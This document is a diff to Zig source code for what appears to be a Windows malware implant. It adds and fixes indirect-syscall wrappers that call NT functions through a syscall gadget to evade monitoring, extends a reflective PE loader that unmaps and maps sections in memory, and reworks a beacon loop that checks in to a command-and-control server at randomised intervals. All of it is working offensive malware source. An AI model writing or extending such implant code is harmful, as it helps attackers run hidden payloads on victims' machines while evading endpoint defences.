@@ -410,7 +410,7 @@ fn nt_protect_virtual_memory_indirect(
           [p3] "{r8}" (@intFromPtr(region_size)),
           [p4] "{r9}" (new_protect),
           [p5] "r" (@as(usize, @intFromPtr(old_protect))),
-        : "r10", "memory"
+        : "r10", "r11", "memory"
     );
     return status;
 }
@@ -500,7 +500,7 @@ fn nt_map_view_of_section_indirect(
 
 fn nt_unmap_view_of_section_indirect(
     ProcessHandle: ?*anyopaque,
-    BaseAddress: *?*anyopaque,
+    BaseAddress: ?*anyopaque,
     syscall_gadget: *anyopaque,
 ) i32 {
     const ssn = syscall_resolver("NtUnmapViewOfSection");
@@ -518,7 +518,7 @@ fn nt_unmap_view_of_section_indirect(
         [gadget] "r" (syscall_gadget),
         [p1] "{rcx}" (@intFromPtr(ProcessHandle)),
         [p2] "{rdx}" (@intFromPtr(BaseAddress)),
-        : "r10", "memory"
+        : "r10", "r11", "memory"
     );
     return status;
 }
@@ -596,10 +596,34 @@ fn nt_wait_for_single_object(
         [p1] "{rcx}" (Handle),
         [p2] "{rdx}" (Alertable),
         [p3] "{r8}" (Timeout),
-        : "r10", "memory"
+        : "r10", "r11", "memory"
     );
     return status;
 }
+
+fn nt_close(
+    Handle: ?*anyopaque,
+    syscall_gadget: *anyopaque,
+) i32 {
+    const ssn = syscall_resolver("NtClose");
+    var status: i32 = undefined;
+
+    asm volatile(
+        \\subq $0x28, %%rsp
+        \\movq %%rcx, %%r10
+        \\movl %[ssn], %%eax
+        \\call *%[gadget]
+        \\addq $0x28, %%rsp
+
+        : [ret] "={rax}" (status),
+        : [ssn] "r" (@as(u32, ssn)),
+        [gadget] "r" (syscall_gadget),
+        [p1] "{rcx}" (Handle),
+        : "r10", "r11", "memory" 
+    );
+    return status;
+}
+
 
 // Not yet in use
 fn nt_queue_apc_thread_indirect(
@@ -991,6 +1015,29 @@ fn reflective_load(allocator: std.mem.Allocator, module_bytes: []u8, gadget: *an
     const nt = @as(*IMAGE_NT_HEADERS64, @ptrFromInt(@intFromPtr(dos) + @as(usize, @intCast(dos.e_lfanew))));
     if (nt.Signature != 0x00004550) return error.InvalidPE;
 
+     const old_base: ?*anyopaque = @ptrFromInt(nt.OptionalHeader.ImageBase);
+     _ = nt_unmap_view_of_section_indirect(
+        @ptrFromInt(@as(usize, @bitCast(CURRENT_PROCESS))),
+        old_base,
+        gadget,
+    );
+
+   if (previous_section_handle) |old_handle| {
+       
+    const close = nt_close(
+        old_handle,
+        gadget,
+    );
+
+    const close_status: u32 = @bitCast(close);
+    if (close_status != 0) {
+        std.debug.print("Failed to close handle with NTSTATUS: 0x{x}\n", .{close_status});
+        return error.closehandlefailed;
+    }
+        previous_section_handle = null;
+    }
+
+
     const sections = @as([*]IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(&nt.OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader));
 
     const tls_dir = nt.OptionalHeader.DataDirectory[9];
@@ -1178,7 +1225,7 @@ fn reflective_load(allocator: std.mem.Allocator, module_bytes: []u8, gadget: *an
             gadget
             );
 
-        const nt_protect_virtual_memory_status: i32 = @bitCast(status);
+        const nt_protect_virtual_memory_status: u32 = @bitCast(status);
 
         if (nt_protect_virtual_memory_status != 0) {
             std.debug.print("NtProtectVirtualMemory failed: 0x{x}\n", .{nt_protect_virtual_memory_status});
@@ -1229,6 +1276,7 @@ if (nt_wait_for_single_object_status != 0) {
     return error.WaitingForThreadFailed;
 } 
 
+ previous_section_handle = section_handle;
     return result.toOwnedSlice();
 }
 
@@ -1238,6 +1286,8 @@ if (nt_wait_for_single_object_status != 0) {
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 var global_gadget: ?*anyopaque = null;
+var previous_pe_base: ?*anyopaque = null;
+var previous_section_handle: ?*anyopaque = null;
 
 // fn loadPEfromC2 <- add me later!
 
@@ -1344,7 +1394,7 @@ fn checkin(allocator: std.mem.Allocator) !void {
 pub fn main() !void {
     var buffer: [2 * 1024 * 1024]u8 = undefined;
     var fba = std.heap.FixedBufferAllocator.init(&buffer);
-    const allocator = fba.allocator();
+    var allocator = fba.allocator();
 
     // initialize Winsock
     try initWinsock();
@@ -1363,6 +1413,9 @@ pub fn main() !void {
     const rand = prng.random();
 
     while (true) {
+         fba = std.heap.FixedBufferAllocator.init(&buffer);
+         allocator = fba.allocator();
+
         checkin(allocator) catch {};
         
         const sleep_sec = rand.intRangeAtMost(u64, 3, 10);
